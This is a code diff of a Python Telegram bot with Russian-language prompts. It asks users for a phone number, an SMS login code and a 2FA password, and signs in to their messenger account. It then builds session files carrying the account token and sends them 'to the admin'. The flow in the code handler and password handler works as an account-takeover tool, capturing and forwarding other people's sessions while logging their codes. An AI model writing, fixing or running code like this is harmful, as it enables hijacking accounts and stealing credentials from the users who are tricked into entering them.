@@ -85,15 +85,15 @@ async def phone_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     work_dir = f"cache/{uid}"
     os.makedirs(work_dir, exist_ok=True)
-    
+
     client = SocketMaxClient(phone=phone, work_dir=work_dir)
     pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}
-    
+
     await state.set_state(AuthState.waiting_for_code)
     await state.update_data(phone=phone, work_dir=work_dir)
-    
+
     msg = await message.answer("⏳ Отправляю SMS...")
-    
+
     async def auth_task():
         try:
             await client.start()
@@ -103,18 +103,18 @@ async def phone_handler(message: types.Message, state: FSMContext):
             logging.info(f"Токен сохранён: {client.token[:20]}...")
         except Exception as e:
             error = str(e).lower()
-            logging.error(f"Ошибка авторизации: {e}")
+            logging.error(f"Ошибка авторизации (phone_handler): {e}")
             if "block" in error:
                 pending[uid]["status"] = "blocked"
             elif "flood" in error or "limit" in error:
-                pending[uid]["status"] = "flood"
+                pending[uid]["status"] = "flood_sms"
             elif "password" in error or "2fa" in error:
                 pending[uid]["status"] = "need_password"
             elif "invalid" in error or "wrong" in error:
-                pending[uid]["status"] = "invalid"
+                pending[uid]["status"] = "invalid_code"
             else:
                 pending[uid]["status"] = f"error:{e}"
-    
+
     asyncio.create_task(auth_task())
     await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
 
@@ -122,67 +122,61 @@ async def phone_handler(message: types.Message, state: FSMContext):
 async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     code = str(message.text.strip())
-    
+
     if uid not in pending:
         return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
-    
+
     data = await state.get_data()
     phone = data["phone"]
     work_dir = data["work_dir"]
-    
+
     import builtins
     builtins._code = code
     logging.info(f"Код передан в pymax: {code} для номера {phone}")
-    
+
     msg = await message.answer("⏳ Проверяю код...")
-    
+
     for _ in range(240):
         await asyncio.sleep(0.5)
         status = pending[uid].get("status", "")
-        
+
         if status == "done":
             token = pending[uid]["token"]
             viewer_id = pending[uid]["user_id"]
             password = gen_password()
             session_id = int(time.time() * 1000)
             device_id = str(uuid.uuid4())
-            
+
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(password, device_id, token, viewer_id)
-            
+
             await send_files(phone, uid, work_dir, desktop, js)
             await msg.edit_text("✅ Готово! Файлы отправлены админу.")
             del pending[uid]
             await state.clear()
             return
-        
+
         elif status == "need_password":
             await state.set_state(AuthState.waiting_for_password)
             await msg.edit_text("🔐 Введи пароль 2FA:")
             return
-        
-        elif status == "invalid":
+
+        elif status == "invalid_code":
             await msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
             return
-        
+
         elif status == "blocked":
             await msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
             del pending[uid]
             await state.clear()
             return
-        
-        elif status == "flood":
-            await msg.edit_text("⏳ Слишком много попыток.")
-            del pending[uid]
-            await state.clear()
-            return
-        
+
         elif status and status.startswith("error:"):
             await msg.edit_text(f"❌ {status[6:]}")
             del pending[uid]
             await state.clear()
             return
-    
+
     await msg.edit_text("❌ Таймаут.")
     del pending[uid]
     await state.clear()
@@ -191,49 +185,49 @@ async def code_handler(message: types.Message, state: FSMContext):
 async def password_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     pwd = message.text.strip()
-    
+
     if uid not in pending:
         return await message.answer("⏳ Сессия устарела.")
-    
+
     data = await state.get_data()
     phone = data["phone"]
     work_dir = data["work_dir"]
-    
+
     import builtins
     builtins._password = pwd
-    
+
     msg = await message.answer("⏳ Проверяю пароль...")
-    
+
     for _ in range(240):
         await asyncio.sleep(0.5)
         status = pending[uid].get("status", "")
-        
+
         if status == "done":
             token = pending[uid]["token"]
             viewer_id = pending[uid]["user_id"]
             password = gen_password()
             session_id = int(time.time() * 1000)
             device_id = str(uuid.uuid4())
-            
+
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(password, device_id, token, viewer_id)
-            
+
             await send_files(phone, uid, work_dir, desktop, js)
             await msg.edit_text("✅ Готово!")
             del pending[uid]
             await state.clear()
             return
-        
+
         elif status == "invalid":
             await msg.edit_text("❌ Неверный пароль.")
             return
-        
+
         elif status == "blocked":
             await msg.edit_text("🚫 Аккаунт заблокирован.")
             del pending[uid]
             await state.clear()
             return
-    
+
     await msg.edit_text("❌ Таймаут.")
     del pending[uid]
     await state.clear()
@@ -241,7 +235,7 @@ async def password_handler(message: types.Message, state: FSMContext):
 async def main():
     import builtins
     original_input = builtins.input
-    
+
     def patched_input(prompt=""):
         prompt_lower = prompt.lower() if prompt else ""
         if "code" in prompt_lower or "код" in prompt_lower:
@@ -259,9 +253,9 @@ async def main():
             builtins._password = None
             return pwd
         return original_input(prompt)
-    
+
     builtins.input = patched_input
-    
+
     logging.info("Бот запущен!")
     await dp.start_polling(bot)
 
